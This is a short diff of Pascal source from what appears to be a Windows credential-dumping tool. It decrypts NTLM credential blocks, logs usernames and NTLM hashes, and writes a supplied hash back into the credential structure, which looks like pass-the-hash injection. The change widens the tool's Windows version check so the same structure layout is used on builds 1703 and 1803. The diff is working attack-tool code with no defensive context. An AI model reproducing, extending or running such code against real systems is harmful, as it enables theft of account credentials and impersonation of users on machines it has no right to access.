@@ -780,7 +780,7 @@ begin
                                                           log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
                                                           {$ifdef CPU64}
                                                           //log(winver);
-                                                          if pos('-1903',winver)>0 then
+                                                          if (pos('-1903',winver)>0) or (pos('-1703',winver)>0) or (pos('-1803',winver)>0) then
                                                              begin
                                                              //log('1903');
                                                              log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK_1903(@decrypted[0]).ntlmhash) ,1);
@@ -800,7 +800,7 @@ begin
                                                           if (luid<>0) and (hash<>'') then
                                                           begin
                                                           {$ifdef CPU64}
-                                                          if pos('-1903',winver)>0
+                                                          if (pos('-1903',winver)>0) or (pos('-1703',winver)>0) or (pos('-1803',winver)>0)
                                                              then PCRED_NTLM_BLOCK_1903(@decrypted[0]).ntlmhash:=HexaStringToByte(hash)
                                                              else PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte(hash);
                                                           {$endif CPU64}
